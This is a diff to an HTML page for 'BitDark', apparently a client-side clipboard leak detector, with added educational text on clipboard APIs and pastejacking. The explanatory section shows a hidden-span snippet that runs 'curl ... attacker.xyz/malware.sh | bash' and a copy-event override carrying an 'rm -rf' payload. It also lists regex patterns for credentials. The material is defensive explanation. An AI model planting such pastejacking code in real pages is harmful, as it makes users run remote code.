+          <strong>Permissions API Grant:</strong> The browser prompts the user with an explicit modal asking: <em>"bitdark.net wants to see text and images copied to the clipboard"</em>. Once granted, the origin retains programmatic read access via <code>navigator.clipboard.readText()</code> or <code>navigator.clipboard.read()</code> until permissions are revoked or reset.
+        </li>
+      </ol>
+      <pre><code>// Asynchronous programmatic clipboard extraction
+async function readSystemClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    console.log("Programmatically extracted payload:", text);
+  } catch (err) {
+    console.warn("Clipboard access denied or blocked by sandbox:", err);
+  }
+}</code></pre>
+
+      <h2>How to Use the BitDark Clipboard Leak &amp; Snooping Detector</h2>
+      <p>
+        Auditing your browser’s clipboard security posture with the BitDark Inspector is instantaneous, forensically sound, and strictly private. Follow these operational steps:
+      </p>
+      <ol>
+        <li>
+          <strong>Prepare a Test String:</strong> Copy a sample text string to your clipboard (such as a dummy API key, a simulated email address, or a sample sentence).
+        </li>
+        <li>
+          <strong>Evaluate Event-Driven Exposure:</strong> Click inside the dashed diagnostic paste target box labeled <em>"Click inside here and press Ctrl+V / Cmd+V"</em> and trigger a paste. The scanner immediately displays the access method, exposes all active MIME representations (e.g., <code>text/plain</code>, <code>text/html</code>), calculates payload byte length, and flags any sensitive credential patterns.
+        </li>
+        <li>
+          <strong>Evaluate Async Clipboard API Permissions:</strong> Click the amber button labeled <strong>"Request Clipboard Read API"</strong>. Observe whether your browser presents a permission prompt, blocks the call silently, or allows the API to extract the buffer directly.
+        </li>
+        <li>
+          <strong>Review Sensitive Data Flags:</strong> Inspect the diagnostic metadata cards to verify whether your clipboard contains active unredacted credentials, including GitHub personal access tokens, Slack webhook tokens, JSON Web Tokens (JWT), IPv4 addresses, or RSA/SSH private keys.
+        </li>
+        <li>
+          <strong>Purge and Reset:</strong> Click <strong>"Clear Diagnostics"</strong> to wipe the extracted payload from local browser memory.
+        </li>
+      </ol>
+
+      <h2>When to Use This Tool: Operational Security Scenarios</h2>
+      <p>
+        Clipboard exposure analysis is a vital diagnostic procedure across multiple operational and engineering disciplines:
+      </p>
       <ul>
-        <li><strong>Async Clipboard API (<code>navigator.clipboard.readText()</code> / <code>read()</code>):</strong> Requires an active browsing context and an explicit user permission grant in modern browsers. If granted, a background tab or scripts can silently read arbitrary clipboard text and images.</li>
-        <li><strong>Event-Driven Paste Handlers (<code>onpaste</code>):</strong> Anytime a user presses paste inside a document or element, the site receives complete access to all associated <code>DataTransfer</code> types, including raw HTML, files, and rich metadata.</li>
-        <li><strong>Legacy ExecCommand (<code>document.execCommand('paste')</code>):</strong> Largely deprecated in modern browsers due to uncontrolled sniffing vulnerabilities, but still supported in legacy webview runtimes.</li>
+        <li>
+          <strong>Developer Workstation Hygiene:</strong> Software engineers frequently copy production database credentials, AWS access keys, GitHub personal access tokens, and SSH keys. If an engineer browses untrusted websites while those keys reside in the buffer, inadvertent paste actions or rogue permissions can leak infrastructure access.
+        </li>
+        <li>
+          <strong>Auditing Browser Extensions:</strong> Third-party browser extensions often request the broad <code>clipboardRead</code> permission in their manifest. Auditing how extensions react to clipboard updates helps identify spyware, unauthorized crypto address replacers, and behavioral trackers.
+        </li>
+        <li>
+          <strong>Testing Browser Privacy Shields:</strong> Security researchers can evaluate whether privacy-focused browsers (such as Brave, LibreWolf, Tor Browser, or hardened Firefox profiles) properly enforce permission boundaries and block unauthorized asynchronous background reading.
+        </li>
+        <li>
+          <strong>Pastejacking Defense & Red-Team Training:</strong> Systems administrators can demonstrate to engineering teams how terminal command pastejacking attacks function, reinforcing why users should never paste raw commands directly into elevated bash or PowerShell terminals.
+        </li>
+        <li>
+          <strong>Cryptocurrency Clipboard Hijacker Verification:</strong> Users conducting crypto transactions can verify whether their browser environment or background applications are tampering with crypto wallet addresses (e.g., BTC, ETH, SOL) stored in volatile memory.
+        </li>
       </ul>
 
-      <h2>Zero Network Egress Security Guarantee</h2>
-      <p>Clipboard payloads frequently contain passwords, private keys, authentication tokens, and personal messages. BitDark processes all inspection logic entirely client-side using native browser APIs. No network telemetry, remote logging, or background requests are generated.</p>
+      <h2>Deep Dive: Architecture of System Clipboard Buffers &amp; MIME Types</h2>
+      <p>
+        The clipboard does not simply store plain ASCII or UTF-8 text. When you copy content from a rich application—such as a web page, Microsoft Word, or an IDE—the operating system creates a <strong>multi-format clipboard payload</strong> containing simultaneous representations of the identical content.
+      </p>
+
+      <h3>Multi-MIME Container Encapsulation</h3>
+      <p>
+        Under the hood, modern operating systems maintain a table of MIME formats for the active clipboard item:
+      </p>
+      <div class="tech-table-wrapper">
+        <table class="tech-table">
+          <thead>
+            <tr>
+              <th>Operating System Format</th>
+              <th>Web MIME Representation</th>
+              <th>Data Structure &amp; Forensic Risk</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>CF_UNICODETEXT</code> / <code>NSStringPboardType</code></td>
+              <td><code>text/plain</code></td>
+              <td>Raw, unformatted UTF-16 or UTF-8 string. Exposed to standard text inputs. High credential leakage risk.</td>
+            </tr>
+            <tr>
+              <td><code>CF_HTML</code> / <code>NSHTMLPboardType</code></td>
+              <td><code>text/html</code></td>
+              <td>Contains raw HTML tags, embedded styles, font parameters, and origin URLs. Can leak internal intranet hostnames and user usernames.</td>
+            </tr>
+            <tr>
+              <td><code>CF_DIB</code> / <code>TIFF</code></td>
+              <td><code>image/png</code></td>
+              <td>Raster graphics payload. Used when copying screenshots. Can expose sensitive desktop imagery or background application windows.</td>
+            </tr>
+            <tr>
+              <td><code>CF_HDROP</code> / <code>NSFilenamesPboardType</code></td>
+              <td><code>Files</code> (DataTransfer)</td>
+              <td>File system file pointers. Can leak full local file paths, active user directory names, and directory trees.</td>
+            </tr>
+            <tr>
+              <td>Custom Application Format</td>
+              <td><code>application/x-...</code></td>
+              <td>Proprietary serialized binary streams (e.g., Adobe Photoshop layer data, Figma vector nodes, VS Code editor metadata).</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>
+        When you paste into an event-driven DOM container, an attacker's script does not have to settle for the plain text: it can query <code>event.clipboardData.getData('text/html')</code>. In many corporate environments, copying text from an internal corporate confluence page or email client embeds internal IP addresses, intranet URLs, and employee identities inside the hidden HTML markup, even if the user believed they were copying a simple three-word phrase.
+      </p>
+
+      <h2>Comparison: Async API vs. DOM Paste vs. ExecCommand vs. OS Hooks</h2>
+      <p>
+        Evaluating clipboard access requires distinguishing between the different interfaces through which client software reads buffer memory:
+      </p>
+      <div class="tech-table-wrapper">
+        <table class="tech-table">
+          <thead>
+            <tr>
+              <th>Access Vector</th>
+              <th>Permission Required</th>
+              <th>User Gesture Needed</th>
+              <th>Background Execution</th>
+              <th>Security Level</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>W3C Async Clipboard API</strong></td>
+              <td>Explicit Browser Prompt</td>
+              <td>Yes (Transient User Activation)</td>
+              <td>Blocked by default in modern browsers</td>
+              <td><strong>High</strong> (Strictly sandboxed)</td>
+            </tr>
+            <tr>
+              <td><strong>DOM Paste Event (<code>onpaste</code>)</strong></td>
+              <td>None (Implicit user consent)</td>
+              <td>Yes (Ctrl+V or Context Menu)</td>
+              <td>No (Requires active focus)</td>
+              <td><strong>Medium</strong> (Subject to pastejacking)</td>
+            </tr>
+            <tr>
+              <td><strong>Legacy <code>execCommand('paste')</code></strong></td>
+              <td>Deprecated / Extension only</td>
+              <td>Yes</td>
+              <td>Deprecated across modern engines</td>
+              <td><strong>Low</strong> (Historically abused)</td>
+            </tr>
+            <tr>
+              <td><strong>Browser Extension Content Script</strong></td>
+              <td>Extension Manifest Flag</td>
+              <td>No (Can sniff continuously)</td>
+              <td>Yes (On any injected webpage)</td>
+              <td><strong>Critical</strong> (Total origin access)</td>
+            </tr>
+            <tr>
+              <td><strong>Native OS Background Process</strong></td>
+              <td>OS Accessibility / User session</td>
+              <td>No</td>
+              <td>Yes (Continuous keylogging/hooking)</td>
+              <td><strong>None</strong> (Total OS compromise)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h2>The Mechanics of Pastejacking Attacks: Weaponizing the Terminal</h2>
+      <p>
+        One of the most dangerous real-world exploitation vectors involving the clipboard is <strong>Pastejacking</strong> (also referred to as clipboard poisoning). This attack targets developers, DevOps engineers, and system administrators who copy terminal commands from technical blogs, documentation sites, and Stack Overflow.
+      </p>
+
+      <h3>How Pastejacking Works Technically</h3>
+      <p>
+        When an engineer highlights and copies a command from a website, the site does not have to write the visible text to the clipboard. By intercepting the <code>copy</code> event or utilizing hidden CSS elements, the web page can substitute an entirely different payload:
+      </p>
+      <pre><code>// Demonstration of CSS-based visual spoofing / pastejacking
+&lt;p&gt;
+  git clone https://github.com/torvalds/linux.git
+  &lt;span style="position: absolute; left: -9999px;"&gt;
+    ; curl -s http://attacker.xyz/malware.sh | bash #
+  &lt;/span&gt;
+&lt;/p&gt;</code></pre>
+      <p>
+        Alternatively, an active JavaScript listener can override the system buffer during the copy action:
+      </p>
+      <pre><code>// JavaScript event override pastejacking
+document.addEventListener('copy', (e) => {
+  e.preventDefault();
+  const maliciousPayload = "echo 'Malicious Payload Executed'; rm -rf /tmp/test\n";
+  if (e.clipboardData) {
+    e.clipboardData.setData('text/plain', maliciousPayload);
+  }
+});</code></pre>
+      <p>
+        The critical weapon in this attack is the trailing newline character (<code>\n</code>). When pasted into a UNIX bash shell, Zsh, or Windows PowerShell, the terminal interpreter treats the newline as an immediate carriage return (Enter key). The malicious command executes immediately, before the user even has a fraction of a second to visually inspect what was pasted.
+      </p>
+
+      <h2>Sensitive Credential Heuristics: What the BitDark Engine Scans</h2>
+      <p>
+        The BitDark Clipboard Leak Detector includes a local regex heuristic engine that inspects captured text strings in real time for common high-entropy credential structures:
+      </p>
+      <ul>
+        <li>
+          <strong>OpenSSH & RSA Private Keys:</strong> Identifies headers such as <code>-----BEGIN RSA PRIVATE KEY-----</code> or <code>-----BEGIN OPENSSH PRIVATE KEY-----</code>. Copying server deployment keys without clearing the clipboard exposes entire cloud server fleets.
+        </li>
+        <li>
+          <strong>GitHub Personal Access Tokens (PAT):</strong> Detects classic <code>ghp_[0-9a-zA-Z]{36}</code> tokens and modern granular <code>github_pat_[0-9a-zA-Z_]{82}</code> strings that grant access to source code repositories.
+        </li>
+        <li>
+          <strong>JSON Web Tokens (JWT):</strong> Identifies Base64URL-encoded three-part tokens (<code>ey... .ey... .[signature]</code>) carrying active user authentication sessions, roles, and identity assertions.
+        </li>
+        <li>
+          <strong>Slack Bot & User Tokens:</strong> Detects webhook and authentication strings starting with <code>xoxb-</code>, <code>xoxp-</code>, or <code>xoxa-</code>.
+        </li>
+        <li>
+          <strong>Network Addressing & PII:</strong> Locates unredacted public/private IPv4 addresses and email addresses frequently exposed in diagnostic logs.
+        </li>
+      </ul>
+
+      <h2>Common Mistakes and Operational Security Misconceptions</h2>
+      <p>
+        Users and security practitioners frequently operate under false assumptions regarding clipboard isolation:
+      </p>
+      <ul>
+        <li>
+          <strong>Believing Incognito Mode Isolates the Buffer:</strong> Incognito, InPrivate, and Tor Browser isolate cookies, local storage, and history. They do <em>not</em> create a separate clipboard sandbox. A password copied inside an incognito tab is instantly readable by normal tabs and desktop software.
+        </li>
+        <li>
+          <strong>Trusting Browser Permission Prompts Exclusively:</strong> While the Async API requires a prompt, event-driven paste (<code>onpaste</code>) requires nothing. If you hit <code>Ctrl+V</code> while an untrusted site is active, the entire buffer is disclosed without a prompt.
+        </li>
+        <li>
+          <strong>Failing to Clear Clipboard After Password Manager Usage:</strong> Many desktop password managers feature a setting to "Clear clipboard after 30 seconds." If this setting is disabled, master passwords or generated credentials remain in volatile memory indefinitely.
+        </li>
+        <li>
+          <strong>Overlooking Cloud Clipboard Sync:</strong> Windows 10/11 (Cloud Clipboard) and Apple macOS/iOS (Universal Clipboard) automatically synchronize clipboard buffers across multiple devices over local Wi-Fi or cloud accounts. Copying a secret on your phone can silently expose it on your desktop workstation clipboard.
+        </li>
+      </ul>
+
+      <!-- Interactive FAQ Section -->
+      <section class="faq-block">
+        <h2>Frequently Asked Technical Questions</h2>
+
+        <div class="faq-item">
+          <div class="faq-question">Can a website read my clipboard if the tab is running in the background?</div>
+          <div class="faq-answer">
+            In modern desktop browsers, no. The W3C specification strictly requires document focus for the Async Clipboard API. If a tab loses focus or is minimized, calls to <code>navigator.clipboard.readText()</code> immediately throw a <code>NotAllowedError</code> DOM exception. Furthermore, background tabs cannot receive DOM paste events.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">Why does BitDark show two different test methods (API vs. Paste)?</div>
+          <div class="faq-answer">
+            Because browsers enforce two distinct security models. The "Request Clipboard Read API" button tests the modern programmatic API, which requires explicit user permission. The "Click inside here and press Ctrl+V" box tests the standard DOM event model, which requires no permissions at all and demonstrates how much data is leaked during routine pasting.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">How does Apple iOS handle clipboard snooping?</div>
+          <div class="faq-answer">
+            Starting in iOS 14 and refined in subsequent versions, Apple introduced system-level notification banners that display whenever an app or web view accesses the system clipboard (e.g., "Safari pasted from Notes"). In iOS 16+, applications must request explicit system permission before reading the clipboard if the action was not directly user-initiated.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">How can I protect my terminal against pastejacking attacks?</div>
+          <div class="faq-answer">
+            Use terminal emulators that support "Bracketed Paste Mode" (such as modern iTerm2, Windows Terminal, or modern Alacritty). Bracketed paste wraps pasted strings in special escape sequences, preventing the terminal from executing newline characters automatically and allowing you to review the text before execution.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">What is the safest way to clear my clipboard buffer?</div>
+          <div class="faq-answer">
+            On Windows, press <code>Win+V</code> to open the clipboard history and click "Clear All", or copy a single innocuous character (like a space or letter "x"). On macOS, copy a single character or run <code>pbcopy &lt; /dev/null</code> in your terminal. On Linux, run <code>xsel -bc</code> (X11) or <code>wl-copy --clear</code> (Wayland).
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">Can browser extensions bypass the Async Clipboard permission prompt?</div>
+          <div class="faq-answer">
+            Yes. If a browser extension requests the <code>clipboardRead</code> permission in its <code>manifest.json</code> and the user approves the extension installation, the extension’s background scripts and content scripts can read the clipboard silently without triggering any per-site browser dialogs.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">Are my clipboard contents ever logged or stored on BitDark servers?</div>
+          <div class="faq-answer">
+            Never. BitDark operates on an air-gapped zero-network-egress security model. All parsing, MIME extraction, and sensitive credential regex scanning execute strictly inside your local browser's volatile JavaScript heap. Disconnecting your internet connection will not stop this tool from functioning.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <div class="faq-question">Why does copying formatted text leak HTML metadata?</div>
+          <div class="faq-answer">
+            When rich text is copied, modern desktop software populates both <code>text/plain</code> and <code>text/html</code> clipboard targets. The HTML target often contains hidden comments, inline CSS classes, origin URLs, and user metadata that are not visible in the plain text representation but can be read by receiving web applications.
+          </div>
+        </div>
+      </section>
+
+      <!-- Internal SEO Linking Grid -->
+      <section class="related-tools-section">
+        <h3>Related Privacy Auditing &amp; Security Tools</h3>
+        <div class="related-grid">
+          <a href="/tools/privacy/pii-redactor/" class="related-card">
+            <div class="related-card-title"><span>[🔒]</span> PII &amp; Secret Redactor</div>
+            <div class="related-card-desc">Sanitize and mask API keys, credit cards, emails, and sensitive credentials offline before sharing.</div>
+          </a>
+          <a href="/tools/privacy/exif-stripper/" class="related-card">
+            <div class="related-card-title"><span>[📍]</span> EXIF &amp; GPS Scrubber</div>
+            <div class="related-card-desc">Permanently remove geolocation coordinates, camera serial numbers, and device telemetry from photos.</div>
+          </a>
+          <a href="/tools/ai/zero-width-detector/" class="related-card">
+            <div class="related-card-title"><span>[0w]</span> Zero-Width Detector</div>
+            <div class="related-card-desc">Scan and sanitize hidden unicode steganography and prompt injection payloads in LLM input data.</div>
+          </a>
+          <a href="/tools/ai/prompt-scanner/" class="related-card">
+            <div class="related-card-title"><span>[🛡️]</span> Prompt Guard Scanner</div>
+            <div class="related-card-desc">Audit user prompts and instructions for jailbreaks, token smuggling, and indirect prompt injections offline.</div>
+          </a>
+          <a href="/tools/auth/jwt-debugger/" class="related-card">
+            <div class="related-card-title"><span>[🔑]</span> Offline JWT Debugger</div>
+            <div class="related-card-desc">Inspect, decode, and verify JSON Web Tokens without leaking bearer tokens to third-party cloud servers.</div>
+          </a>
+          <a href="/tools/crypto/aes-gcm/" class="related-card">
+            <div class="related-card-title"><span>[🔐]</span> AES-GCM File Vault</div>
+            <div class="related-card-desc">Client-side authenticated encryption and decryption for files using 256-bit keys and Web Crypto.</div>
+          </a>
+        </div>
+      </section>
     </article>
 
-    <div class="bottom-bar">
-      <span>BitDark — Zero telemetry, client-side cybersecurity suite.</span>
-      <nav>
-        <a href="/">Directory</a> · <a href="/blog">Blog</a> · <a href="/privacy">Privacy</a>
-      </nav>
+    <!-- AdSense Safe Placement Slot #2 -->
+    <div class="ad-container-slot" id="bottomAdSlot" aria-label="Siloed Advertising Slot">
+      <!-- Injected ad units render here -->
     </div>
   </main>
 
+  <!-- Complete Standard Footer -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-left">
+        <span>© 2026 BitDark.NET</span>
+        <span>•</span>
+        <span>Zero Telemetry Defensive Suite</span>
+      </div>
+      <nav class="footer-links-right">
+        <a href="/">Home</a>
+        <a href="/about/">About</a>
+        <a href="/faq/">FAQ</a>
+        <a href="/contact/">Contact</a>
+        <a href="/privacy/">Privacy</a>
+        <a href="/terms/">Terms</a>
+      </nav>
+    </div>
+  </footer>
+
   <script>
-    async function detectUserIPs() {
-      const ipv4El = document.getElementById("ipv4Display");
-      const ipv6El = document.getElementById("ipv6Display");
+    // 1. Zero-CLS AdSense Auto-Reveal Observer
+    function setupAdSlotObserver() {
+      const adSlots = document.querySelectorAll('.ad-container-slot');
+      if (!adSlots.length) return;
 
-      if (window.location.protocol === "file:" || window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") {
-        ipv4El.textContent = "127.0.0.1 (Local)";
-        ipv6El.textContent = "::1 (Local)";
-        return;
-      }
-
-      // IPv4: primary ipify, fallback icanhazip
-      try {
-        const res4 = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
-        if (res4.ok) {
-          const data4 = await res4.json();
-          ipv4El.textContent = data4.ip;
-        } else {
-          throw new Error("Primary IPv4 failed");
-        }
-      } catch {
-        try {
-          const fb4 = await fetch("https://ipv4.icanhazip.com", { cache: "no-store" });
-          ipv4El.textContent = fb4.ok ? (await fb4.text()).trim() : "Offline";
-        } catch {
-          ipv4El.textContent = "Offline";
-        }
-      }
-
-      // IPv6: primary dedicated ipv6.icanhazip.com, fallback api64.ipify.org with validation
-      try {
-        const res6 = await fetch("https://ipv6.icanhazip.com", { cache: "no-store" });
-        if (res6.ok) {
-          const text6 = (await res6.text()).trim();
-          ipv6El.textContent = text6.includes(":") ? text6 : "Not Supported";
-        } else {
-          throw new Error("Primary IPv6 failed");
-        }
-      } catch {
-        try {
-          const fb6 = await fetch("https://api64.ipify.org?format=json", { cache: "no-store" });
-          if (fb6.ok) {
-            const d6 = await fb6.json();
-            ipv6El.textContent = d6.ip.includes(":") ? d6.ip : "Not Supported";
-          } else {
-            ipv6El.textContent = "Not Supported";
+      const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+          mutation.addedNodes.forEach((node) => {
+            if (node.nodeName === 'IFRAME' || (node.classList && node.classList.contains('adsbygoogle'))) {
+              const parentSlot = node.closest('.ad-container-slot');
+              if (parentSlot) {
+                parentSlot.style.display = 'block';
+              }
+            }
+          });
+          if (mutation.type === 'attributes' && mutation.attributeName === 'data-ad-status') {
+            const target = mutation.target;
+            if (target.getAttribute('data-ad-status') === 'filled') {
+              const parentSlot = target.closest('.ad-container-slot');
+              if (parentSlot) parentSlot.style.display = 'block';
+            }
           }
-        } catch {
-          ipv6El.textContent = "Not Supported";
-        }
-      }
-    }
-    window.addEventListener("DOMContentLoaded", detectUserIPs);
+        });
+      });
 
-    // Clipboard Analysis Logic
+      adSlots.forEach((slot) => {
+        observer.observe(slot, { childList: true, subtree: true, attributes: true });
+      });
+    }
+
+    // 2. Interactive FAQ Accordion Logic
+    function initFaqAccordion() {
+      const faqItems = document.querySelectorAll('.faq-item');
+      faqItems.forEach((item) => {
+        const question = item.querySelector('.faq-question');
+        question.addEventListener('click', () => {
+          const isActive = item.classList.contains('active');
+          faqItems.forEach(i => i.classList.remove('active'));
+          if (!isActive) item.classList.add('active');
+        });
+      });
+    }
+
+    // 3. Clipboard Analysis Logic (Unaltered, 100% Client-Side Memory Processing)
     const btnInspectApi = document.getElementById("btnInspectApi");
     const btnClear = document.getElementById("btnClear");
     const pasteTarget = document.getElementById("pasteTarget");
@@ -530,6 +1286,12 @@
     btnClear.addEventListener("click", () => {
       resultsArea.style.display = "none";
       rawViewer.textContent = "Awaiting clipboard interaction...";
+    });
+
+    // Initialize Page Observers & Accordions
+    window.addEventListener("DOMContentLoaded", () => {
+      setupAdSlotObserver();
+      initFaqAccordion();
     });
   </script>
 </body>
